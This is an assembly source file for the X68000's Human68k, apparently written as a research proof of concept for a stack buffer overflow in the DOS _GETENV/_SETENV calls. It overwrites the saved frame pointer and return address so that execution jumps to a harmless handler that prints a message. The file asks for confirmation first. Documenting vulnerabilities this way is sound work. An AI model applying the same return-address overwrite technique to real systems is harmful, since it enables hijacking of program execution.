.title env_sbo - DOS _GETENV/_SETENV stack buffer overflow PoC

;This file is part of Xperiment68k
;Copyright (C) 2023 TcbnErik
;
;This program is free software: you can redistribute it and/or modify
;it under the terms of the GNU General Public License as published by
;the Free Software Foundation, either version 3 of the License, or
;(at your option) any later version.
;
;This program is distributed in the hope that it will be useful,
;but WITHOUT ANY WARRANTY; without even the implied warranty of
;MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;GNU General Public License for more details.
;
;You should have received a copy of the GNU General Public License
;along with this program.  If not, see <https://www.gnu.org/licenses/>.

.include macro.mac
.include console.mac
.include doscall.mac
.include iocscall.mac

.include xputil.mac


.cpu 68000
.text

ProgramStart:
  addq.l #1,a2
  SKIP_SPACE a2
  sne d7  ;$00=getenv $ff=setenv

  pea (Occured,pc)
  tst.b (sp)
  bne @f  ;ハイメモリ上で実行された
    tas (sp)  ;$00だと文字列終端とみなされてしまうので$80にする
  @@:
  move.l (sp)+,d0
  bsr containsZeroByte
  bne @f
    DOS_PRINT (ContainsZeroMessage,pc)
    move #1,-(sp)
    DOS _EXIT2
  @@:
  move.l d0,(RtsAddress)

  move.b d7,d0
  bsr askExecute
  beq 9f

  lea (Buffer,pc),a0
  clr.b (a0)
  pea (a0)
  clr.l -(sp)
  pea (EnvName,pc)
  tst.b d7
  beq 1f
    DOS _SETENV
    bra @f
  1:
    DOS _GETENV
  @@:
  lea (12,sp),sp
  move.l d0,d1

  DOS_PRINT (ResultMessage,pc)
  move.l d1,d0
  bsr PrintD0l
  DOS_PRINT (CrLf,pc)
9:
  DOS _EXIT


askExecute:
  lea (DosGetEnvMessage,pc),a0
  tst.b d0
  beq @f
    lea (DosSetEnvMessage,pc),a0
  @@:
  DOS_PRINT (a0)

  DOS_PRINT (PromptMessage,pc)
  clr.l -(sp)  ;0=no 1=yes

  lea (Buffer,pc),a0
  move #8<<8+0,(a0)
  pea (a0)
  move #.low._GETS,-(sp)
  DOS _KFLUSH
  addq.l #6,sp
  subq.l #3,d0
  bne @f
    cmpi.l #'yes'<<8+0,(2,a0)
    bne @f
      addq.l #1,(sp)
  @@:
  DOS_PRINT (CrLf,pc)

  move.l (sp)+,d0
  rts


;d0.lの各バイトのいずれかが$00か調べる
containsZeroByte:
  PUSH d0/a0
  lea (sp),a0  ;スタックに保存したd0.lの先頭
  moveq #4-1,d0
  @@:
    tst.b (a0)+
  dbeq d0,@b
  POP d0/a0
  rts


.quad
  nop  ;直後のアドレスの下位8ビットが$00になるのを回避する
Occured:
  lea (OccuredMessage,pc),a1
  IOCS _B_PRINT
  @@:
    nop  ;無限ループ
  bra @b


PrintD0l:
  lea (Buffer,pc),a0
  bsr ToHexString8
  DOS_PRINT (Buffer,pc)
  rts

  DEFINE_TOHEXSTRING8 ToHexString8


.data

.even
EnvName:
  .dcb.b 256,'a'
  .dcb.b 4,'a'  ;link a6,#-256 で保存されたa6レジスタを上書きするデータ
RtsAddress:
  .ds.l 1  ;rtsで戻るアドレスを上書きするデータ
  .dc.b 0


ContainsZeroMessage:
  .dc.b '実行アドレスの都合が悪いため、何らかの常駐プログラムを'
  .dc.b '組み込むなどしてアドレスをずらしてください。',CR,LF,0

DosGetEnvMessage: .dc.b 'DOS _GETENV ',0
DosSetEnvMessage: .dc.b 'DOS _SETENV ',0

PromptMessage:
  .dc.b 'スタック破壊の実験を行います。',CR,LF
  .dc.b 'プログラムが終了しないためリセットする必要があります。',CR,LF
  .dc.b 'コピーバックのディスクキャッシュなどはあらかじめ解除してください。',CR,LF
  .dc.b CR,LF
  .dc.b '実行してよろしいですか？(yes/no):',0

OccuredMessage:
  .dc.b 'スタックバッファオーバーフローが発生しました。'
  .dc.b 'リセットしてください。',CR,LF,0

ResultMessage: .dc.b 'result: $',0
CrLf: .dc.b CR,LF,0


.bss
.quad

Buffer: .ds.b 256


.end ProgramStart
